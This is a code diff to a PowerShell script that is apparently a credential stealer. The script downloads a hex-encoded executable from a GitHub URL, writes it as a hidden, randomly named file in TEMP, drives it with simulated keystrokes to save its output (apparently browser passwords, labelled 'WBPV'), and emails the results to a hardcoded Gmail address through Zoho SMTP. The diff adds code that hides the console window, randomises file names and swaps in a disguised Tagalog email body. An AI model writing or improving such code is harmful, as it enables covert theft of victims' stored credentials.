@@ -1,3 +1,11 @@
+$memberDefinition = @'
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@
+$type = Add-Type -MemberDefinition $memberDefinition -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
+$handle = (Get-Process -Id $PID).MainWindowHandle
+$type::ShowWindow($handle, 0) # 0 = Hidden
+
 function New-MemoryAttachment {
     param (
         [Parameter(Mandatory=$true)]
@@ -33,10 +41,10 @@ function New-MemoryAttachment {
 
 function Send-ZohoEmail {
     param (
-        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
+        [string]$FromEmail = "Ang Mangagawa <zqrvstef0rc5edk@zohomail.com>",
         [string]$ToEmail = "srve650@gmail.com",
         [string]$Subject,
-        [string]$Body = "Hello, this is a test email with an attachment.",
+        [string]$Body = "Ang kabuuang ani ng iyong bukirin.",
         [PSObject[]]$Attachments = @(), # MUST BE PSObject
         [string]$SmtpServer = "smtp.zoho.com",
         [int]$Port = 587,
@@ -78,7 +86,8 @@ function Send-ZohoEmail {
 # Run WBPV 
 # 1. Download and Prepare
 $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
-$tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")
+$randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+$tempPath = [System.IO.Path]::Combine($env:TEMP, "$randName.txt")
 Invoke-WebRequest -Uri $url -OutFile $tempPath
 
 $hexString = Get-Content -Path $tempPath -Raw
@@ -88,7 +97,6 @@ for ($i = 0; $i -lt $hexString.Length; $i += 2) {
 }
 
 # 1. Create and Start the Random EXE
-$randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
 $tempExePath = Join-Path $env:TEMP "$randName.exe"
 [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
 (Get-Item $tempExePath).Attributes = 'Hidden'
@@ -111,7 +119,7 @@ Start-Sleep -Milliseconds 1000
 Start-Sleep -Milliseconds 500
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
-Start-Sleep -Seconds 2 # Wait for the save to finish
+Start-Sleep -Seconds 1 # Wait for the save to finish
 
 # 2. FORCE CLEANUP
 try {
